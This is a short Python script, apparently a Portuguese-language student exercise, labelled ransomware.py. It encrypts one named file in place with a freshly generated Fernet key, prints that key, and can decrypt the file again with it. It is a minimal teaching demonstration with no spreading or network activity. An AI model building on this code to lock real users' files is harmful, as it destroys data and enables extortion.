""" RA:95108
    Aluno: Diogo Alves de Almeida
    
    script: ransomware.py [-h] --action ACTION --file FILE [--key KEY]
    
    EXEMPLO:
        encriptar: ransomware.py --action encrypt --file teste.txt
        desencripitar: ransomware.py --action decrypt --file teste.txt --key bL1WgzxcIdsTXFIrJH64Ce4_cRv74ZX9gCdTbuE0e7U=
"""
import os
from os.path import expanduser
from cryptography.fernet import Fernet
import base64


class Ransomware:

    def __init__(self, key=None):
        self.key = key
        self.cryptor = None

    def generate_key(self):
        """Gera uma chave de 128-bit AES para encripitar arquivos."""
        self.key = Fernet.generate_key()
        self.cryptor = Fernet(self.key)

    def read_key(self, key):
        self.key = key
        self.cryptor = Fernet(self.key)

    def write_key(self):
        print(self.key.decode("utf-8"))

    def crypt_file(self, file_path, encrypted=False):
        with open(file_path, 'rb+') as f:
            _data = f.read()

            if not encrypted:
                print('Arquivo antes: ' + str(_data.decode("utf-8")))
                data = self.cryptor.encrypt(_data)
                print('Encripitado: ' + str(data.decode("utf-8")))
            else:
                data = self.cryptor.decrypt(_data)
                print('Desencriptado: ' + str(data.decode("utf-8")))

            f.seek(0)
            f.truncate()
            f.write(data)


if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('--action', required=True)
    parser.add_argument('--file', required=True)
    parser.add_argument('--key')

    args = parser.parse_args()
    action = args.action.lower()
    keyfile = args.key
    arquivo = args.file

    rware = Ransomware()

    if action == 'decrypt':
        rware.read_key(keyfile)
        rware.crypt_file(arquivo, encrypted=True)
    elif action == 'encrypt':
        rware.generate_key()
        rware.write_key()
        rware.crypt_file(arquivo)
